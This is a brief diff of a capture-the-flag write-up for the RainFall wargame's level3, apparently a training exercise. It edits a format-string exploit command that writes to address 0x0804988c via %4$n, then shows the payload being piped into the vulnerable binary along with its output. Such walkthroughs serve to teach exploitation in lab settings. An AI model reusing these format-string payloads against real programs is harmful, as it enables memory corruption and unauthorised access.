@@ -104,7 +104,7 @@ We found success with just 5 addresses and discovered that the string <code>AAAA
 
 ## exploit
 ``` shell
-level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "F"*60 + "%4$n"' > /tmp/flag3
+level3@RainFall:~$ python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60d%4$n"' > /tmp/flag3
 level3@RainFall:~$ cat /tmp/flag3 - | ./level3
 �FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
 Wait what?!
